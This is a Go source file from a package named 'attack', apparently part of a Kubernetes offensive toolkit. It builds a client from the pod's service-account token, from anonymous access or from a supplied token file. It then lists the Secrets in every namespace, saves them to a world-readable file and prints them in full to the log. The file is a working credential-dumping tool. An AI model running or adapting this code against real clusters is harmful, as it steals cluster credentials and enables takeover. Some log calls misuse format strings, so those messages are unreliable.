package attack

import (
	"errors"
	"io/ioutil"
	"net"
	"os"

	log "github.com/sirupsen/logrus"

	"context"
	"encoding/json"

	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/client-go/kubernetes"
	rest "k8s.io/client-go/rest"
	certutil "k8s.io/client-go/util/cert"
	"k8s.io/klog/v2"
)

var secretApi = "/api/v1/secrets"

func SelfSAConfig(tokenPath string) (*rest.Config, error) {
	tokenFile := tokenPath
	const (
		rootCAFile = "/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"
	)
	host, port := os.Getenv("KUBERNETES_SERVICE_HOST"), os.Getenv("KUBERNETES_SERVICE_PORT")
	if len(host) == 0 || len(port) == 0 {
		return nil, rest.ErrNotInCluster
	}

	token, err := ioutil.ReadFile(tokenFile)
	if err != nil {
		return nil, err
	}

	tlsClientConfig := rest.TLSClientConfig{}

	if _, err := certutil.NewPool(rootCAFile); err != nil {
		klog.Errorf("Expected to load root CA config from %s, but got err: %v", rootCAFile, err)
	} else {
		tlsClientConfig.CAFile = rootCAFile
	}

	return &rest.Config{
		// TODO: switch to using cluster DNS.
		Host:            "https://" + net.JoinHostPort(host, port),
		TLSClientConfig: tlsClientConfig,
		BearerToken:     string(token),
		BearerTokenFile: tokenFile,
	}, nil
}

func K8sSecretsDump(token string) {
	var config = new(rest.Config)
	var err = errors.New("")
	switch token {
	case "anonymous":
		config, err = rest.InClusterConfig()
		if err != nil {
			log.Fatal(err)
		}
		config = rest.AnonymousClientConfig(config)
	case "default":
		config, err = rest.InClusterConfig()
		if err != nil {
			log.Fatal(err)
		}
	default:
		config, err = SelfSAConfig(token)
		if err != nil {
			log.Fatal(err)
		}
	}

	clientset, err := kubernetes.NewForConfig(config)
	if err != nil {
		log.Fatal(err)
	}
	secrets, err := clientset.CoreV1().Secrets("").List(context.TODO(), metav1.ListOptions{})
	if err != nil {
		log.Fatal(err)
	}
	log.Println("Get %d Secrets", len(secrets.Items))
	data, err := json.Marshal(secrets)
	if err != nil {
		log.Fatal(err)
	}
	output := "cluster_secrets"
	if err = ioutil.WriteFile(output, data, 0644); err != nil {
		log.Fatal(err)
	}
	log.Info(string(data))
	log.Info("Cluster Secrets have been saved to %s", output)
}
